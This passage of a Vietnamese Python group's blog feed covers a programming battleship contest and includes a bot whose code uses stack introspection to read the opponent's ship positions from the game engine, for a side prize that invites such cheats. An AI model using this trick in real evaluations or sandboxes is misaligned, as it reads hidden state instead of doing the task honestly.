                                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

                        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;opponent_ships&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="vm"&gt;__class__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;ship&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="vm"&gt;__class__&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                                        &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
                        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;step&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
                        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;opponent_ships&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="vm"&gt;__class__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;entity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MissileCruiser&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                                        &lt;span class="k"&gt;break&lt;/span&gt;
                        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;ship&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="vm"&gt;__class__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;entity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MissileCruiser&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;orientation&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;entity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HORIZONTAL&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                                        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                                &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                                        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                        &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;orientation&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;entity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HORIZONTAL&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                                        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                                &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                                        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;


        &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_opponent_ships&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                &lt;span class="n"&gt;frames&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;inspect&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;stack&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
                &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;frame&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;frames&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;frame&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;__turn&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                                &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

                &lt;span class="n"&gt;gameObj&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;frame&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;f_locals&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;self&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gameObj&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;players&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
                        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;gameObj&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;players&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="vm"&gt;__class__&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="vm"&gt;__class__&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                                &lt;span class="k"&gt;break&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;gameObj&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ships&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;entry&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;HolePlayer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;t_ocean&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;
        &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;step&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Xin chúc mừng bạn Xuân Nam.&lt;/p&gt;
</content><category term="battleship"></category><category term="bach phat bach trung"></category></entry><entry><title>Giải phụ bách phát bách trúng</title><link href="/2010/12/giai-phu-bach-phat-bach-trung.html" rel="alternate"></link><published>2010-12-13T08:08:00+07:00</published><updated>2010-12-13T08:08:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2010-12-13:/2010/12/giai-phu-bach-phat-bach-trung.html</id><summary type="html">&lt;p&gt;Cuộc tranh tài &lt;a class="reference external" href="http://www.vithon.org/2010/12/13/kết-quả-bắn-suồng"&gt;Bắn Suồng&lt;/a&gt; tuy đã kết thúc nhưng dư âm (và cả bao nỗi niềm ấm ức, tức tưởi) của nó vẫn còn vấn vương trong tâm trí các bạn tham gia.&lt;/p&gt;
&lt;p&gt;Vì vậy, mình xin đề nghị một giải phụ của Bắn Suồng với thể lệ như …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuộc tranh tài &lt;a class="reference external" href="http://www.vithon.org/2010/12/13/kết-quả-bắn-suồng"&gt;Bắn Suồng&lt;/a&gt; tuy đã kết thúc nhưng dư âm (và cả bao nỗi niềm ấm ức, tức tưởi) của nó vẫn còn vấn vương trong tâm trí các bạn tham gia.&lt;/p&gt;
&lt;p&gt;Vì vậy, mình xin đề nghị một giải phụ của Bắn Suồng với thể lệ như sau:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Nếu bạn tạo được một suồng &amp;quot;bách phát bách trúng&amp;quot;, mình sẽ tặng áo với chữ ký của người sáng lập nhóm PCNV. Điều này cũng có nghĩa là có thể có nhiều hơn một bài thắng giải.&lt;/li&gt;
&lt;li&gt;&amp;quot;Bách phát bách trúng&amp;quot; được hiểu theo nghĩa một phát bắn phải trúng ít nhất một tàu.&lt;/li&gt;
&lt;li&gt;Bạn có thể sử dụng mọi kỹ thuật (mũ đen hay trắng) để làm việc này.&lt;/li&gt;
&lt;li&gt;Thời hạn nhận bài là hết ngày 19 tháng 12 năm 2010.&lt;/li&gt;
&lt;li&gt;Bài tham gia phải sử dụng ngôn ngữ Python làm ngôn ngữ chính, và nộp mã nguồn.&lt;/li&gt;
&lt;li&gt;Bài tham gia gửi về cho admin+thư+rác&amp;#64;vithon.org (nhớ bỏ phần chống spam phía sau nhé).&lt;/li&gt;
&lt;li&gt;Mình xin giữ toàn quyền quyết định kết quả.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Chúc may mắn.&lt;/p&gt;
</content></entry><entry><title>Kết quả Bắn Suồng</title><link href="/2010/12/ket-qua-ban-suong.html" rel="alternate"></link><published>2010-12-13T07:54:00+07:00</published><updated>2010-12-13T07:54:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2010-12-13:/2010/12/ket-qua-ban-suong.html</id><summary type="html">&lt;p&gt;Ngày hôm qua tại Đại học RMIT, nhóm PCNV đã tổ chức thi Bắn Suồng trực tiếp (cùng với việc truyền hình trực tiếp) cuộc tranh tài Bắn Suồng.&lt;/p&gt;
&lt;p&gt;Kỳ thi này nhận được bốn bài tham dự: &lt;strong&gt;fire_sheep&lt;/strong&gt;, &lt;strong&gt;checker&lt;/strong&gt;, &lt;strong&gt;randome&lt;/strong&gt;, và &lt;strong&gt;bibo&lt;/strong&gt;. Tuy nhiên, bài &lt;strong&gt;bibo&lt;/strong&gt; vì gửi vào …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Ngày hôm qua tại Đại học RMIT, nhóm PCNV đã tổ chức thi Bắn Suồng trực tiếp (cùng với việc truyền hình trực tiếp) cuộc tranh tài Bắn Suồng.&lt;/p&gt;
&lt;p&gt;Kỳ thi này nhận được bốn bài tham dự: &lt;strong&gt;fire_sheep&lt;/strong&gt;, &lt;strong&gt;checker&lt;/strong&gt;, &lt;strong&gt;randome&lt;/strong&gt;, và &lt;strong&gt;bibo&lt;/strong&gt;. Tuy nhiên, bài &lt;strong&gt;bibo&lt;/strong&gt; vì gửi vào 0152 sáng 12/12 nên đã bị loại.&lt;/p&gt;
&lt;p&gt;Kết quả trận tranh tài căng thẳng, và đầy hồi hộp (lẫn may mắn) là:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;&lt;strong&gt;fire_sheep&lt;/strong&gt; thắng &lt;strong&gt;checker&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;fire_sheep&lt;/strong&gt; thua &lt;strong&gt;randome&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;checker&lt;/strong&gt; thua &lt;strong&gt;randome&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Như vậy, &amp;quot;suồng&amp;quot; randome đã đăng quang vô địch kỳ thi lần này. Tác giả của &lt;strong&gt;randome&lt;/strong&gt;, không ai khác, chính là tác giả của tin này :-D.&lt;/p&gt;
&lt;p&gt;Hẹn gặp các bạn vào những kỳ thi thú vị tới.&lt;/p&gt;
&lt;p&gt;Tái bút: Mã nguồn của Bắn Suồng và các bài tranh tài có thể được tải về tại &lt;a class="reference external" href="http://www.vithon.org/static/ban-suong.zip"&gt;http://www.vithon.org/static/ban-suong.zip&lt;/a&gt;.&lt;/p&gt;
</content></entry><entry><title>Tranh tài Bắn Suồng</title><link href="/2010/11/tranh-tai-ban-suong.html" rel="alternate"></link><published>2010-11-26T03:23:00+07:00</published><updated>2010-11-26T03:23:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2010-11-26:/2010/11/tranh-tai-ban-suong.html</id><summary type="html">&lt;p&gt;Cập nhật: Phiên bản &lt;tt class="docutils literal"&gt;battleship.zip&lt;/tt&gt; cũ có lỗi. Các bạn tải về bản mới hoặc sửa dòng &lt;tt class="docutils literal"&gt;player2_mod = __import__(opts.player_1)&lt;/tt&gt; thành &lt;tt class="docutils literal"&gt;player2_mod = __import__(opts.player_2)&lt;/tt&gt;. Xin cáo lỗi vì sự phiền toái này.&lt;/p&gt;
&lt;p&gt;Nhóm PCNV hân hạnh tổ chức một cuộc thi mới: &lt;strong&gt;Tranh tài Bắn Suồng!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Bắn …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cập nhật: Phiên bản &lt;tt class="docutils literal"&gt;battleship.zip&lt;/tt&gt; cũ có lỗi. Các bạn tải về bản mới hoặc sửa dòng &lt;tt class="docutils literal"&gt;player2_mod = __import__(opts.player_1)&lt;/tt&gt; thành &lt;tt class="docutils literal"&gt;player2_mod = __import__(opts.player_2)&lt;/tt&gt;. Xin cáo lỗi vì sự phiền toái này.&lt;/p&gt;
&lt;p&gt;Nhóm PCNV hân hạnh tổ chức một cuộc thi mới: &lt;strong&gt;Tranh tài Bắn Suồng!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Bắn Suồng (xin lỗi vì sai chính tả, nhưng để giữ chữ viết tắt BS nên tôi đành phải đặt tên trò chơi là vậy) không phải là một trò chơi thông thường. Để chơi trò chơi này, các bạn phải viết mã bằng ngôn ngữ... (cho xin 500 đồng trống và kèn cho hào hứng tí nào) Python để điều khiển các đối tượng trong trò chơi.&lt;/p&gt;
&lt;p&gt;Các bạn có thể tải trò chơi về tại địa chỉ &lt;a class="reference external" href="http://www.vithon.org/static/battleship.zip"&gt;http://www.vithon.org/static/battleship.zip&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Cuộc thi Bắn Suồng được tổ chức với thể lệ như sau:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Mô-đun (các tập tin &lt;strong&gt;.py&lt;/strong&gt;) tham gia phải gửi về cho admin+thư-rác&amp;#64;vithon.org (bỏ phần + thư rác) trước ngày 12 tháng 12 năm 2010.&lt;/li&gt;
&lt;li&gt;Các bài thi này sẽ được kiểm tra trước khi được chấp nhận cho thi.&lt;/li&gt;
&lt;li&gt;Các bài tham dự sẽ đấu vòng tròn tính điểm. Thắng sẽ được 3 điểm, hòa được 1, và thua được 0 điểm.&lt;/li&gt;
&lt;li&gt;Các trận đấu sẽ được truyền hình (qua web) trực tiếp vào ngày 12 tháng 12.&lt;/li&gt;
&lt;li&gt;Vùng biển sẽ có kích thước ngẫu nhiên với độ rộng và dài tối thiểu là 10, và tối đa là 15.&lt;/li&gt;
&lt;li&gt;Một giải nhất sẽ nhận được 01 chiếc áo Vithon miễn phí, và có thể mua thêm 01 chiếc áo khác với giá ưu đãi &lt;strong&gt;100.000&lt;/strong&gt;!&lt;/li&gt;
&lt;li&gt;Quyết định của ban tổ chức là cuối cùng. Xin được phép không nhận khiếu nại.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Để trao đổi về cuộc thi này, cũng như các vấn đề liên quan đến lập trình Python, các bạn có thể sử dụng &lt;a class="reference external" href="forum.vithon.org"&gt;diễn đàn&lt;/a&gt; của nhóm hoặc liên hệ qua IRC.&lt;/p&gt;
&lt;p&gt;Nhóm PCNV rất mong nhận được sự tham gia nhiệt tình của các bạn.&lt;/p&gt;
</content><category term="battleship"></category><category term="game"></category><category term="contest"></category></entry><entry><title>Áo Vithon thành phẩm</title><link href="/2010/11/ao-vithon-thanh-pham.html" rel="alternate"></link><published>2010-11-24T05:26:00+07:00</published><updated>2010-11-24T05:26:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2010-11-24:/2010/11/ao-vithon-thanh-pham.html</id><summary type="html">&lt;p&gt;Sau một số trục trặc không lường trước, nhóm PCNV cũng đã nhận được áo Vithon thành phẩm từ nhà in. Nhóm xin được hân hạnh giới thiệu với các bạn một số ảnh chụp áo thật sau:&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="" src="http://va8.upanh.com/thumbpic/16.734.21073133.eds0/img20101124110821.700x0.jpg" /&gt;
&lt;p class="caption"&gt;&lt;a class="reference external" href="http://ca8.upanh.com/16.734.21073133.eds0/img20101124110821.jpg"&gt;Mặt trước&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class="figure"&gt;
&lt;img alt="" src="http://va9.upanh.com/thumbpic/16.734.21073134.MGr0/img20101124110836.700x0.jpg" /&gt;
&lt;p class="caption"&gt;&lt;a class="reference external" href="http://ca9.upanh.com/16.734.21073134.MGr0/img20101124110836.jpg"&gt;Mặt sau&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;Nhóm PCNV xin cảm ơn nhóm mẫu Mập …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Sau một số trục trặc không lường trước, nhóm PCNV cũng đã nhận được áo Vithon thành phẩm từ nhà in. Nhóm xin được hân hạnh giới thiệu với các bạn một số ảnh chụp áo thật sau:&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="" src="http://va8.upanh.com/thumbpic/16.734.21073133.eds0/img20101124110821.700x0.jpg" /&gt;
&lt;p class="caption"&gt;&lt;a class="reference external" href="http://ca8.upanh.com/16.734.21073133.eds0/img20101124110821.jpg"&gt;Mặt trước&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class="figure"&gt;
&lt;img alt="" src="http://va9.upanh.com/thumbpic/16.734.21073134.MGr0/img20101124110836.700x0.jpg" /&gt;
&lt;p class="caption"&gt;&lt;a class="reference external" href="http://ca9.upanh.com/16.734.21073134.MGr0/img20101124110836.jpg"&gt;Mặt sau&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;Nhóm PCNV xin cảm ơn nhóm mẫu Mập Ốm đã mua ủng hộ hai chiếc áo cỡ L và S để tạo ra được hai bức hình đẹp &amp;quot;rạng ngời&amp;quot; này. Một số người đã mặc áo đa số đều có chung nhận định áo mặc &lt;strong&gt;thoải mái lắm&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Áo sẽ được bán với giá &lt;strong&gt;185.000 đồng&lt;/strong&gt; cho những người đang đi làm, và &lt;strong&gt;150.000 đồng&lt;/strong&gt; cho các bạn học sinh, sinh viên đại học trở xuống. Tại TPHCM, mong các bạn ghé địa chỉ 224 Nguyễn Thái Bình, phường 12, quận Tân Bình, trong giờ làm việc từ thứ hai đến thứ sáu mỗi tuần. Các bạn ở tỉnh khác xin vui lòng liên lạc với nhóm PCNV.&lt;/p&gt;
&lt;p&gt;Áo Vithon cũng sẽ được sử dụng làm &lt;strong&gt;giải thưởng&lt;/strong&gt; cho những kỳ thi sắp tới của nhóm PCNV. Mong các bạn hăng hái tham gia giựt giải.&lt;/p&gt;
</content><category term="t-shirt"></category><category term="vithon"></category></entry><entry><title>Giới thiệu áo của nhóm PCNV</title><link href="/2010/09/gioi-thieu-ao-cua-nhom-pcnv.html" rel="alternate"></link><published>2010-09-10T04:17:00+07:00</published><updated>2010-09-10T04:17:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2010-09-10:/2010/09/gioi-thieu-ao-cua-nhom-pcnv.html</id><summary type="html">&lt;p&gt;Trong mấy tuần vừa qua, nhóm PCNV đã huy động toàn bộ sức lực để hoàn thành mẫu thiết kế áo thun chính thức của nhóm. Xin hân hạnh giới thiệu cùng các bạn thiết kế đầy ấn tượng này.&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="" src="/static/ao_vithon_truoc_thumb.png" /&gt;
&lt;p class="caption"&gt;&lt;a class="reference external" href="/static/ao_vithon_truoc.png"&gt;Mặt trước&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class="figure"&gt;
&lt;img alt="" src="/static/ao_vithon_sau_thumb.png" /&gt;
&lt;p class="caption"&gt;&lt;a class="reference external" href="/static/ao_vithon_sau.png"&gt;Mặt sau&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;Hiện áo đang được đưa đi …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Trong mấy tuần vừa qua, nhóm PCNV đã huy động toàn bộ sức lực để hoàn thành mẫu thiết kế áo thun chính thức của nhóm. Xin hân hạnh giới thiệu cùng các bạn thiết kế đầy ấn tượng này.&lt;/p&gt;
&lt;div class="figure"&gt;
&lt;img alt="" src="/static/ao_vithon_truoc_thumb.png" /&gt;
&lt;p class="caption"&gt;&lt;a class="reference external" href="/static/ao_vithon_truoc.png"&gt;Mặt trước&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class="figure"&gt;
&lt;img alt="" src="/static/ao_vithon_sau_thumb.png" /&gt;
&lt;p class="caption"&gt;&lt;a class="reference external" href="/static/ao_vithon_sau.png"&gt;Mặt sau&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;Hiện áo đang được đưa đi in với số lượng &lt;strong&gt;50&lt;/strong&gt; chiếc. Nếu bạn có nhu cầu muốn đặt mua áo thì vui lòng liên lạc với nhóm PCNV trong &lt;a class="reference external" href="forum.vithon.org"&gt;diễn đàn&lt;/a&gt;, hoặc qua kênh IRC &lt;strong&gt;#vithon&lt;/strong&gt; ở máy chủ &lt;strong&gt;irc.freenode.net&lt;/strong&gt; (&lt;a class="reference external" href="http://webchat.freenode.net"&gt;http://webchat.freenode.net&lt;/a&gt;). Giá dự tính của mỗi chiếc áo sẽ ít hơn &lt;strong&gt;một trăm năm mươi nghìn đồng&lt;/strong&gt;. Do số lượng có hạn nên áo sẽ được phân phát theo phương thức &lt;em&gt;nhanh tay thì còn&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Nhóm PCNV không chịu trách nhiệm nếu người mặc áo bị các lập trình viên khác gây chuyện!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Nhóm PCNV trân trọng cảm ơn công sức thâu đêm suốt sáng nhiều tuần liền của các thành viên năng nổ sau:&lt;/p&gt;
&lt;dl class="docutils"&gt;
&lt;dt&gt;Kịch bản&lt;/dt&gt;
&lt;dd&gt;Hoàng Quốc Thịnh&lt;/dd&gt;
&lt;dt&gt;Đạo diễn&lt;/dt&gt;
&lt;dd&gt;Nguyễn Thành Nam&lt;/dd&gt;
&lt;dt&gt;Hiệu ứng&lt;/dt&gt;
&lt;dd&gt;Lê Ngọc Hiếu&lt;/dd&gt;
&lt;dt&gt;Sản xuất&lt;/dt&gt;
&lt;dd&gt;Phan Đắc Anh Huy&lt;/dd&gt;
&lt;dt&gt;Chỉ đạo nghệ thuật&lt;/dt&gt;
&lt;dd&gt;Tập thể diễn viên hài PCNV&lt;/dd&gt;
&lt;/dl&gt;
&lt;p&gt;Chúc các bạn vui vẻ!&lt;/p&gt;
</content><category term="t-shirt"></category></entry><entry><title>Cuộc thi viết chương trình theo dõi mã máy</title><link href="/2010/07/cuoc-thi-viet-chuong-trinh-theo-doi-ma-may.html" rel="alternate"></link><published>2010-07-22T05:13:00+07:00</published><updated>2010-07-22T05:13:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2010-07-22:/2010/07/cuoc-thi-viet-chuong-trinh-theo-doi-ma-may.html</id><summary type="html">&lt;p&gt;Một người bạn của chúng ta đã có nhã ý tài trợ cho một cuộc thi nhỏ.&lt;/p&gt;
&lt;p&gt;Mục tiêu: Viết một công cụ bằng ngôn ngữ Python để thực hiện việc lưu lại những lệnh gọi hàm ở mức hợp ngữ trong khi thực thi của một chương trình thông …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Một người bạn của chúng ta đã có nhã ý tài trợ cho một cuộc thi nhỏ.&lt;/p&gt;
&lt;p&gt;Mục tiêu: Viết một công cụ bằng ngôn ngữ Python để thực hiện việc lưu lại những lệnh gọi hàm ở mức hợp ngữ trong khi thực thi của một chương trình thông thường khác.&lt;/p&gt;
&lt;p&gt;Ví dụ: Với đoạn mã tương tự như sau:&lt;/p&gt;
